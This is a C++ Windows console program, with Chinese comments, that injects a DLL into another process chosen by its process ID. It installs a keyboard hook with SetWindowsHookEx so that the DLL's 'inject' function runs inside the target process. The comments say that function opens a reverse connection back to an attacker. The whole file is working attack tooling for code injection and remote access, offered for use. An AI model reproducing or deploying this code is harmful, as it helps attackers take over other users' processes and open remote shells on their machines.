// HookDllInject.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <tlhelp32.h>
//通过进程ID获取线程ID
DWORD getThreadID(DWORD pid)
{
	puts("获取线程ID");
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE)
	{
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te))
		{
			do
			{
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))
				{
					if (te.th32OwnerProcessID == pid)
					{
						HANDLE hThread = OpenThread(READ_CONTROL, FALSE, te.th32ThreadID);
						if (!hThread)
						{
							puts("不能得到线程句柄");
						}
						else
						{

							return te.th32ThreadID;
						}
					}
				}
			} while (Thread32Next(h, &te));
		}
	}
	CloseHandle(h);
	return (DWORD)0;
}

//注入函数
int processInject(int pid)
{
	DWORD processID = (DWORD)pid;

	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
	//打开指定进程
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);

	if (NULL != hProcess)
	{
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
		{
			GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
		}
	}

	_tprintf(TEXT("开始注入到进程 %s PID: %u\n"), szProcessName, processID);
	//获取线程ID
	DWORD threadID = getThreadID(processID);

	printf("使用线程 ID %u\n", threadID);

	if (threadID == (DWORD)0)
	{
		puts("找不到线程");
		return -1;
	}
	//加载我们用于反弹连接的DLL
	HMODULE dll = LoadLibrary(L"inject2.dll");
	if (dll == NULL)
	{
		puts("找不到DLL");
		return -1;
	}
	//获取dll中inject函数（用于反弹链接）
	HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "inject");
	if (addr == NULL)
	{
		puts("找不到DLL中的函数");
		return -1;
	}
	//设置全局钩子，当发生键盘消息时调用inject函数
	HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, threadID);

	if (handle == NULL)
	{
		puts("不能HOOK键盘消息");
	}
	getchar();
	getchar();
	getchar();
	UnhookWindowsHookEx(handle);
	return 0;
}

int main(int argc, char* argv)
{

	int pid;
	puts("你要注入线程的ID号?");
	scanf_s("%u", &pid);
	printf("进入PID: %u\n", pid);
	int result = processInject(pid);
	if (result == -1)
	{
		puts("不能被注入");
	}
	else
	{
		puts("注入成功");
	}
	getchar();

}